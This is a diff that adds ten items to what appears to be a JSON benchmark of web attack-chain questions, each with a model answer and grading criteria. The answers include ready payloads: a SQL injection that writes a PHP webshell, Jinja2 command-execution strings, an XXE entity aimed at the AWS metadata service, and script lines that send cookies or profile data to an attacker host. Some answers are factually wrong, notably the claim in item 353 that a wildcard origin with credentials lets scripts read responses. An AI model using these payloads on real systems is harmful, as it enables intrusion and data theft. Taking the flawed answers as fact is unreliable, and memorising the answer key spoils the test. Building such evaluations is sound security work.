@@ -3771,5 +3771,115 @@
     "impact_level": "Critical \u2013 Complete authentication and authorization bypass",
     "category": "chain_scenarios",
     "evaluation_criteria": "Must explain why the 'none' algorithm is dangerous and how forged JWTs bypass signature verification; Must identify that authorization checks must re-verify claims server-side and cannot rely solely on token contents."
+  },
+  {
+    "id": 344,
+    "scenario": "An internal service monitoring dashboard is accessible only via localhost. A file proxy endpoint accepts arbitrary URLs without validation, allowing SSRF to internal addresses.",
+    "chain_steps": "SSRF to localhost admin panel \u2192 Credential/token extraction \u2192 API reuse for system commands \u2192 Remote code execution",
+    "prompt": "Explain how SSRF to an internal admin panel leads to RCE.",
+    "expected_answer": "The attacker exploits an SSRF vulnerability in the file proxy by crafting a request to http://localhost:8080/admin, bypassing the frontend's IP restriction. The internal admin dashboard leaks API credentials or JWT tokens in its HTML response. These credentials are valid for backend API calls that execute system commands. By extracting tokens from the SSRF response and sending authenticated requests to /api/system/execute?cmd=, the attacker achieves RCE. The key insight is that SSRF grants network access to restricted zones where higher-privilege services expose dangerous endpoints. Mitigation requires: (1) disallow localhost/internal IPs in proxy URLs, (2) separate credential storage from web responses, (3) implement strict API endpoint permissions, and (4) use cryptographic token binding tied to request origin.",
+    "reasoning_requirement": "Recognize that SSRF isn't just network scanning\u2014it's a privilege escalation into zones where internal services trust localhost traffic without re-authenticating.",
+    "impact_level": "Critical \u2013 Remote Code Execution via credential escalation",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain why SSRF to localhost bypasses IP restrictions and identify how leaked credentials from the internal panel are then leveraged for RCE via API commands."
+  },
+  {
+    "id": 345,
+    "scenario": "A notification system sends emails with unescaped user-controlled content. Emails are viewed in a browser. Admin dashboard uses HTML forms with no CSRF tokens. Session cookies are not HttpOnly.",
+    "chain_steps": "Inject XSS payload in notification email \u2192 Admin opens email in browser \u2192 Payload executes in admin context \u2192 CSRF request modifies admin password \u2192 Account takeover",
+    "prompt": "Detail the XSS-to-CSRF-to-account-takeover chain in email-driven applications.",
+    "expected_answer": "The attacker crafts a notification message with embedded JavaScript: <img src=x onerror=\"fetch('/admin/change-password', {method: 'POST', body: 'password=attacker123'})\">. When the admin opens the email, the browser executes the payload in the admin's authenticated session. Since the password change endpoint lacks CSRF tokens and the JavaScript has access to session cookies (not HttpOnly), the request succeeds. The attacker can then login as the admin. The vulnerability chain relies on three failures: (1) XSS in email templates via unescaped user input, (2) CSRF protection absence on state-changing endpoints, (3) absence of HttpOnly flag on session cookies allowing JavaScript access. Prevention requires: content security policies, automatic email HTML sanitization, CSRF tokens on all state-changing operations, and HttpOnly + Secure + SameSite cookies.",
+    "reasoning_requirement": "Understand that XSS in email contexts bypasses browser isolation boundaries and executes in admin's authenticated session, enabling CSRF without user interaction.",
+    "impact_level": "Critical \u2013 Complete account takeover of privileged user",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must trace XSS execution in admin session through CSRF request payload delivery and explain why absence of CSRF tokens and HttpOnly cookies enables silent authentication bypass."
+  },
+  {
+    "id": 346,
+    "scenario": "A social network's API endpoint /api/users/{user_id}/profile returns full user objects without authorization checks. User IDs are sequential integers.",
+    "chain_steps": "Enumerate user IDs sequentially \u2192 Fetch /api/users/{id}/profile \u2192 Extract PII from response \u2192 Aggregate and sell dataset",
+    "prompt": "Explain the IDOR-based PII leak and its scale.",
+    "expected_answer": "The attacker iterates through user IDs (1, 2, 3, ...) and requests /api/users/{id}/profile without any authorization mechanism validating that the requester owns that ID. Each response contains SSN, date of birth, phone number, address, and email. Since IDs are predictable integers, the attacker can programmatically scrape the entire user database in minutes. The vulnerability stems from absent access control: the server trusts the client-provided ID and returns data without verifying the requester's relationship to the target user. At scale, this exposes millions of records. Prevention requires: (1) implement token-based resource ownership verification (ensure JWT sub matches resource owner), (2) use unpredictable IDs (UUIDs), (3) apply authorization middleware to all endpoints returning user data, (4) log and alert on batch ID enumeration patterns, and (5) rate-limit per-user API calls.",
+    "reasoning_requirement": "Recognize that IDOR exploits trust in client-supplied IDs when servers lack access control, enabling horizontal privilege escalation at scale.",
+    "impact_level": "Critical \u2013 Mass PII exposure of entire user base",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain why sequential IDs enable automation and identify the specific authorization check missing from the endpoint implementation."
+  },
+  {
+    "id": 347,
+    "scenario": "A search feature accepts user input directly in SQL queries: SELECT * FROM posts WHERE title LIKE '%' . $input . '%'. The database user has FILE permissions enabled. The web root is writable.",
+    "chain_steps": "SQL injection into search parameter \u2192 Use INTO OUTFILE to write PHP webshell \u2192 Access written file via HTTP \u2192 Execute arbitrary commands",
+    "prompt": "Trace the SQL injection to file write to RCE chain.",
+    "expected_answer": "The attacker injects: ' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- into the search box. The SQL query executes, writing a PHP webshell to the web root. The attacker then requests /shell.php?cmd=id, and the web server executes the PHP code, returning command output. The vulnerability chain requires: (1) unsanitized user input in SQL queries (no prepared statements), (2) database user with FILE privileges (overly permissive), (3) web root writable by database user, and (4) PHP execution enabled in the target directory. Exploitation is seamless because SQL is executed server-side and bypasses file upload restrictions entirely. Prevention: (1) use parameterized queries religiously, (2) revoke FILE privileges from application database users, (3) store uploads outside web root, (4) disable script execution in upload directories via .htaccess or web server config, and (5) run database and web server with minimal required privileges.",
+    "reasoning_requirement": "Understand that SQL injection's power extends beyond data exfiltration\u2014when combined with file write capabilities, it becomes RCE.",
+    "impact_level": "Critical \u2013 Remote code execution via database write",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain how UNION SELECT enables arbitrary file write and identify the three security controls (prepared statements, file permissions, execution restrictions) required to prevent this chain."
+  },
+  {
+    "id": 348,
+    "scenario": "A login page includes a 'Return to' parameter that redirects users post-login. The app uses OAuth for authentication. The redirect URI validation is case-insensitive and allows partial domain matching.",
+    "chain_steps": "Craft open redirect via case variation \u2192 Redirect to attacker's domain during OAuth callback \u2192 Intercept authorization code \u2192 Exchange code for OAuth token \u2192 Compromise victim account",
+    "prompt": "Explain the open redirect to OAuth token theft vulnerability chain.",
+    "expected_answer": "The attacker registers attacker.com and crafts a login link: /login?returnTo=attacker.com/oauth-callback. OAuth redirect URI validation checks if the return URL contains the allowed domain but uses case-insensitive matching or substring matching. The attacker's domain passes validation. After the user authenticates via OAuth, the application redirects to attacker.com/oauth-callback with an authorization code. The attacker's server receives the code, then exchanges it for an access token via the OAuth provider's token endpoint using the victim's authorization code. The attacker now holds a valid OAuth token for the victim's account. The vulnerability requires: (1) lenient redirect URI validation, (2) authorization code exposed in redirect, (3) attacker ability to register similar domain. Prevention: (1) use exact hostname matching (not substring), (2) store authorization code server-side with PKCE flow, (3) implement state parameter validation, (4) log suspicious OAuth flows, and (5) use short-lived authorization codes.",
+    "reasoning_requirement": "Recognize that open redirects in OAuth flows are particularly dangerous because the redirect carries authentication state that can be captured and reused.",
+    "impact_level": "Critical \u2013 OAuth token theft and account takeover",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must identify the specific redirect validation flaw and explain how the intercepted authorization code is converted into a valid OAuth token without user involvement."
+  },
+  {
+    "id": 349,
+    "scenario": "A file upload form accepts templates with .tpl extension. Uploaded files are stored in a publicly accessible directory. The application renders uploaded templates server-side using Jinja2.",
+    "chain_steps": "Upload malicious Jinja2 template with SSTI payload \u2192 Application processes template \u2192 Template injection executes Python code \u2192 Remote code execution",
+    "prompt": "Explain Server-Side Template Injection via file upload.",
+    "expected_answer": "The attacker uploads a file named exploit.tpl containing: {{ config.items() }}. When the application processes this file with Jinja2's render function, the template syntax is evaluated server-side. The attacker crafts payloads like {{ self._TemplateModule__loader.get_source(None, '/etc/passwd')[0] }} to read files or {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} to execute commands. SSTI occurs because the template engine interprets user-controlled input as template directives, not literal strings. The vulnerability requires: (1) file upload accepting template files, (2) server-side template rendering of user files, (3) template engine configured without sandboxing. Prevention: (1) disable server-side template rendering of user uploads, (2) validate file types strictly (whitelist only), (3) sandbox template execution in restricted environments, (4) use template auto-escape and disable dangerous features like {{ range() }}, and (5) store uploads outside web root.",
+    "reasoning_requirement": "Understand that file upload + template processing = RCE, because templates aren't data\u2014they're code.",
+    "impact_level": "Critical \u2013 Remote code execution via template injection",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain why server-side template rendering of user files is inherently dangerous and identify at least two specific Jinja2 introspection techniques used for RCE."
+  },
+  {
+    "id": 350,
+    "scenario": "An XML parsing endpoint accepts user-submitted documents without DTD restrictions. Internal services expose metadata via HTTP on 169.254.169.254. AWS credentials are retrieved from the metadata service.",
+    "chain_steps": "XXE payload references AWS metadata service \u2192 XXE reads metadata response \u2192 SSRF to 169.254.169.254 \u2192 Retrieve IAM credentials \u2192 Compromise AWS account",
+    "prompt": "Detail the XXE-to-SSRF-to-AWS-metadata exploitation chain.",
+    "expected_answer": "The attacker submits XML with an external entity: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><root>&xxe;</root>. The XML parser resolves the entity by making an HTTP request to the AWS metadata service. The response contains the name of the IAM role. A second request to .../latest/meta-data/iam/security-credentials/{role_name}/ returns temporary AWS credentials (access key, secret key, session token). The attacker uses these credentials to call AWS APIs and enumerate/compromise the cloud infrastructure. The vulnerability chain requires: (1) XML parser with entity expansion enabled, (2) no input validation filtering SYSTEM entities, (3) network access from the application to metadata services, (4) metadata service credentials exposed without MFA. Prevention: (1) disable external entity resolution (XXE prevention), (2) disable DOCTYPE declarations entirely, (3) use XML schema validation with declared entities only, (4) restrict outbound HTTP to metadata services via network policies, and (5) use IAM roles with minimal permissions and enable credential rotation.",
+    "reasoning_requirement": "Recognize that XXE is powerful not just for LFI, but as a gateway to SSRF for accessing privileged metadata services.",
+    "impact_level": "Critical \u2013 Cloud account compromise via AWS credential theft",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain how XXE enables SSRF to the metadata service and identify the specific AWS credential endpoints targeted in the exploitation."
+  },
+  {
+    "id": 351,
+    "scenario": "A JavaScript application recursively merges user-supplied configuration objects into a global config object without property whitelisting. The config object's prototype is modifiable.",
+    "chain_steps": "Inject payload into config merge \u2192 Pollute Object.prototype \u2192 Inject XSS payload into page rendering function \u2192 Payload executes in browser context \u2192 Account compromise",
+    "prompt": "Explain prototype pollution leading to XSS.",
+    "expected_answer": "The attacker submits configuration: {\"__proto__\": {\"renderHandler\": \"<img src=x onerror='fetch(\\\"/steal?cookie=\\\" + document.cookie)'>\"}}.  The recursive merge function copies properties from the user object into the global config, including __proto__. This modifies Object.prototype.renderHandler. When the application renders the page, it calls config.renderHandler, which resolves through the prototype chain to the injected XSS payload. The browser executes the payload, sending cookies to the attacker. Prototype pollution exploits JavaScript's dynamic property lookup\u2014any property access on any object checks the prototype chain. The vulnerability requires: (1) recursive object merge without prototype checks, (2) user-controllable input merged into global objects, (3) merged properties used in security-sensitive contexts (rendering, authentication). Prevention: (1) use Object.create(null) to create objects without prototype chains, (2) use Object.assign with whitelisted keys only, (3) avoid merging user input into global state, (4) implement Content Security Policy to block inline scripts, and (5) use Object.defineProperty to freeze dangerous prototype properties.",
+    "reasoning_requirement": "Understand that prototype pollution is about altering the behavior of application code by poisoning the base prototype objects.",
+    "impact_level": "High \u2013 XSS via prototype chain manipulation",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain how __proto__ modification affects all objects in the application and identify the connection between prototype pollution and the resulting XSS payload execution."
+  },
+  {
+    "id": 352,
+    "scenario": "A DNS provider allows custom DNS records for subdomains. An application has SSRF protection checking if the target IP is localhost or private. The application makes HTTP requests to user-supplied hostnames.",
+    "chain_steps": "Register attacker domain \u2192 First resolution returns attacker IP (passes SSRF check) \u2192 Second resolution returns localhost (DNS rebinding) \u2192 Browser makes request to localhost target \u2192 Bypass SSRF protections",
+    "prompt": "Explain DNS rebinding as a technique to bypass SSRF protections.",
+    "expected_answer": "The attacker registers attacker.com with a short TTL. The application checks if attacker.com resolves to a private IP\u2014it doesn't, so it passes the SSRF protection. The application makes an HTTP request to http://attacker.com. The first DNS lookup returns the attacker's server IP (legitimate). However, the attacker configures DNS to respond with localhost/127.0.0.1 on the second query. The browser's HTTP client performs a new DNS lookup (due to keep-alive timeout or separate requests), receives 127.0.0.1, and connects to localhost. The application now reaches the protected service via the attacker's domain name. This bypasses IP-based SSRF filters because the protection checks the hostname resolution at request time, but doesn't validate consistency of DNS responses. Prevention: (1) validate that all DNS resolutions for a hostname consistently resolve to the same IP within a request, (2) avoid relying solely on IP-based filtering (use hostname whitelists), (3) implement response validation and rate-limiting on local targets, (4) use DNS pinning (cache DNS responses), and (5) disable client redirects to private IPs.",
+    "reasoning_requirement": "Recognize that DNS rebinding exploits the gap between hostname validation and actual connection, treating DNS as a state-change vector.",
+    "impact_level": "High \u2013 SSRF bypass to access protected internal services",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain why IP-based SSRF protections fail under DNS rebinding and identify the specific timing/caching differences that enable the exploit."
+  },
+  {
+    "id": 353,
+    "scenario": "An API uses CORS with Access-Control-Allow-Origin set to '*' and Access-Control-Allow-Credentials set to 'true'. Session cookies are used for authentication. An attacker controls a website visited by users.",
+    "chain_steps": "Attacker's website makes cross-origin API request \u2192 Browser includes session cookies automatically \u2192 CORS headers allow credentials \u2192 JavaScript reads sensitive response \u2192 Session data exposed to attacker",
+    "prompt": "Explain CORS misconfiguration leading to session theft.",
+    "expected_answer": "The attacker embeds JavaScript on their website: fetch('https://victim.com/api/user/profile', {credentials: 'include'}).then(r => r.json()).then(d => new Image().src = 'attacker.com/steal?data=' + btoa(JSON.stringify(d))). When a victim visits the attacker's site while logged into victim.com, the browser automatically includes the victim's session cookies with the cross-origin request (due to credentials: 'include'). The CORS misconfiguration (Allow-Origin: *, Allow-Credentials: true) permits the response to be read by JavaScript. The attacker's script sends the sensitive response (containing user profile, email, personal details) to attacker.com via an image beacon. The vulnerability arises from the contradiction in CORS: allowing credentials (*) with wildcard origins defeats the origin isolation model. Prevention: (1) never use Access-Control-Allow-Origin: * with credentials, (2) explicitly list allowed origins (not wildcards), (3) don't set Allow-Credentials: true unless necessary, (4) use SameSite cookies (Strict/Lax), (5) implement CSRF tokens for state-changing operations, and (6) require user confirmation for sensitive operations.",
+    "reasoning_requirement": "Understand that CORS is about allowing cross-origin requests while maintaining security\u2014misconfiguration with credentials creates a window for session theft.",
+    "impact_level": "Critical \u2013 Session hijacking via CORS-enabled credential exfiltration",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain why Access-Control-Allow-Credentials: true combined with wildcard origin is dangerous and identify the specific JavaScript technique for exfiltrating the response data."
   }
 ]
